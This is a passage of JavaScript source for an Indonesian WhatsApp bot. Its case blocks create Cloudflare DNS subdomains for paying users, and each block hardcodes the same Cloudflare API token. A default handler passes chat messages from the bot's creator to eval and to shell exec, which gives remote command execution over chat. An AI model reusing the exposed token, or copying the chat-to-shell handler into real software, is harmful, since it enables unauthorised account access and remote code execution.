               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannelku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain11': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "06a3fe4e7eec313be8ef30b744fcfeb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain12': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "04f62c54a011fe7929342bde68c6deb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "storepannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain13': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cc152c1a6c73b934af4e3c71d47f15db";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokopannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain14': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5efd37e4f4f1186ca6a92d6366b8d485";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain15': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3b103a544abad82f68f03395cf8effda";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "adminpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain16': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "10bf5f40f9e6fe74fe5647c2b143de3a";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain17': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5c38f987cf217bfe2bf682d5bb310fe8";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokocpannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain18': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "736705fd97bebdf03ca4a007c2ca4a8f";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "websitepannelmurah.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break

      //=================================================//
      default:
        if (budy.startsWith("=>")) {
          if (!isCreator)
            return m.reply(
              `Maaf Command Tersebut Khusus Developer Bot WhatsApp`
            );
          function Return(sul) {
            sat = JSON.stringify(sul, null, 2);
            bang = util.format(sat);
            if (sat == undefined) {
              bang = util.format(sul);
            }
            return m.reply(bang);
          }
          try {
            m.reply(
              util.format(eval(`(async () => { return ${budy.slice(3)} })()`))
            );
          } catch (e) {
            m.reply(String(e));
          }
        }
        if (budy.startsWith(">")) {
          if (!isCreator)
            return m.reply(
              `Maaf Command Tersebut Khusus Developer Bot WhatsApp`
            );
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string")
              evaled = require("util").inspect(evaled);
            await m.reply(evaled);
          } catch (err) {
            await m.reply(String(err));
          }
        }
        if (budy.startsWith("$")) {
          if (!isCreator)
            throw `Maaf Command Tersebut Khusus Developer Bot WhatsApp`;
          exec(budy.slice(2), (err, stdout) => {
            if (err) return m.reply(err);
            if (stdout) return m.reply(stdout);
          });
        }
        if (m.chat.endsWith("@s.whatsapp.net") && isCmd) {
          this.anonymous = this.anonymous ? this.anonymous : {};
          let room = Object.values(this.anonymous).find(
            (room) =>
              [room.a, room.b].includes(m.sender) && room.state === "CHATTING"
          );
          if (room) {
            if (/^.*(next|leave|start)/.test(m.text)) return;
            if (
              [
                ".next",
                ".leave",
                ".stop",
                ".start",
                "Cari Partner",
                "Keluar",
                "Lanjut",
                "Stop",
              ].includes(m.text)
            )
              return;
            let other = [room.a, room.b].find((user) => user !== m.sender);
            m.copyNForward(
              other,
              true,
              m.quoted && m.quoted.fromMe
                ? {
                    contextInfo: {
                      ...m.msg.contextInfo,
                      forwardingScore: 0,
                      isForwarded: true,
                      participant: other,
                    },
                  }
                : {}
            );
          }
          return !0;
        }
        if (isCmd && budy.toLowerCase() != undefined) {
          if (m.chat.endsWith("broadcast")) return;
          if (m.isBaileys) return;
          let msgs = global.db.data.database;
          if (!(budy.toLowerCase() in msgs)) return;
          ZassTdr.copyNForward(m.chat, msgs[budy.toLowerCase()], true);
        }
    }
  } catch (err) {
    m.reply(util.format(err));
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});